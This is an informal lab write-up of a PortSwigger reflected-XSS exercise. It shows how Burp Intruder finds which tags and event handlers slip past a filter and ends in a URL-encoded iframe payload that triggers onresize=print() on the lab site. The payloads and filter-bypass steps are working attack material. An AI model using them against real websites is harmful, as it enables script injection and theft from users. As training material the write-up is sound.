///Lab: Reflected XSS into HTML context with most tags and attributes blocked///

I've searched on <img src=1 onerror=alert(1)>, and <script>alert(1)</script>, i got an error "tag is not allowed", i've tried to figure out which tag is not allowed...maybe <>? but nope.
ive tried onerror=print(), didnt work...
So as in the readme there is a firewall. It is not allowing the ususal tags, but it allows the <> signs...so every searh reflected in the url, so all we have to do is to try until there will be a working tag.
There is a XSS cheat-sheet at https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
We can copy all the tags from here...So in burpsuit send the search's get request to intruder. Change this part:GET /?search=%3C%3E HTTP/2 to GET /?search=<> HTTP/2 and put a position between the to marks.
And from the cheat-sheet site copy all the tags, and insert them into the payloads configuration. Every bad try we got back a HTTP/2 400 Bad Request if the result is 200 we have a win.
Lets run the attack. We got 2 results "body" and "xss" so our payload will be <body...something...> So go back to the cheat-sheet's page, and click on body tag, and lets see how these loads looks like...
<body onafterprint=alert(1)> ....<style>@keyframes slidein {}</style><body style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></body>
etc etc...so our form will be : <body ....xyz...=print()>all we have to do is the same like we did before redo the intruder with <body §§=print()> copy all the events to clipboard and paste them into the payload
configuration, and run the attack and if we have http 200 we won...And we have a lot of wins...
I've tried them 1by1...
<body oncontentvisibilityautostatechange=print() style=display:block;content-visibility:auto> -->this one is working so lets check if its solves our lab...Go to the exploit server, and type into the "body" part:
<iframe src="https://0a8300150483596d809403b9006b00b0.web-security-academy.net/?search=<body oncontentvisibilityautostatechange=print() style=display:block;content-visibility:auto>">
store and explore it...it works, but it didnt solved the lab. So we will need another one...
Im looking for only "Event handlers that do not require user interaction". the next one is oneresize...<body onresize="print()"> so we will copy this into our payload:
<iframe src="https://0a8300150483596d809403b9006b00b0.web-security-academy.net/?search="><body onresize=print()>">
But remember we will upload this into a html code... so " = %22 ; > = %3E ; < = %3C ; space = %20
<iframe src="https://0a8300150483596d809403b9006b00b0.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"> BUT! we need a plus tag, because we upload our payload to the server, but it wont load in
automatically we have to trigger it somehow. And since our payload is a resizing payload we can trigger it with the "onload" tag, because this will automatically change the iframe's height while the page is loading in.
<iframe src="https://0a8300150483596d809403b9006b00b0.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.height='200px'>

